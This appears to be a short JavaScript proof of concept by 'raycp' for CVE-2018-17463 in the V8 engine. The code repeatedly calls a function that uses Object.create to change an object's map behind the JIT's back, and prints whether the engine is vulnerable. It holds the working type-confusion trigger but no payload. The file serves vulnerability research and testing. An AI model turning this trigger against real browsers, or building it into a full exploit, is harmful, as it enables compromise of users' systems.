/*************************************************************
 * File Name: poc.js
 * 
 * Created on: 2020-01-03 18:16:34
 * Author: raycp
 * 
 * Last Modified: 2020-01-03 18:42:32
 * Description: poc for CVE-2018-17463
************************************************************/

const NUM_PROPERTIES = 32;
const MAX_ITERATIONS = 100000;

function check_vuln(){
    function hax(o) {
        // forced a map check
        o.inline;

        // change the map, but v8 think it has no side-effect
        Object.create(o);

        return o.outline;
    }
    
    for (let i=0; i<MAX_ITERATIONS; i++){
        let o = {inline: 0x6666};
        o.outline = 0x7777;
        if(hax(o) !== 0x7777) {
            return;
        }
    }
    throw "[-] Not vulnerable"

}

check_vuln();
print("[+] v8 version is vulnerable");
